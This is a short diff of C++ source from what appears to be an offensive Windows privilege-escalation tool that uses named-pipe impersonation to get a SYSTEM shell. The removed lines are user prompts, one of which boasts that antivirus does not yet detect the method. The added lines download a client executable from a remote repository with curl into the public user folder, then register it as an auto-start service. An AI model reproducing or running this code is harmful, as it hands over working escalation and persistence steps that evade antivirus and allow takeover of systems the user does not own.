@@ -26,16 +26,10 @@ using namespace std;
 
 BOOL NamedPipeImpersonate()
 {
-    printf("==============================================================================\n");
-    printf("Before we continue setting up the pipe server to receive the client, make sure to place the named pipe client executable in the c:\\users\\public directory\n");
-    printf("If not, this will not work unless you already manually created a service to connect to the named pipe server.\n");
-    printf("The client is in my github repo, called warpzoneclient.exe (shoutouts to super mario bros.)  Just compile it or download the release binary\n\n");
-    printf("Why do all this prep work?  Because AV detects echo commands and several other common methods for the client to connect.  AV doesn't detect this method...yet\n");
-    printf("If you're ready to go, hit enter and enjoy your SYSTEM shell...if you're not ready, just do control+c and do preparations first ;)\n");
-    printf("==============================================================================\n");
-    cin.get();
     setProcessPrivs(SE_IMPERSONATE_NAME);
-
+    cout << "[+] Downloading named pipe client for you from the repo\n";
+    WinExec("curl -L -o \"c:\\users\\public\\warpzoneclient.exe\" \"https://github.com/g3tsyst3m/elevationstation/raw/main/warpzoneclient.exe\"", 0);
+    Sleep(3000);
     WinExec("cmd.exe /c sc create plumber binpath= \"C:\\Users\\public\\warpzoneclient.exe\" DisplayName= plumber start= auto", 0);
     
     /* [Deprecated]
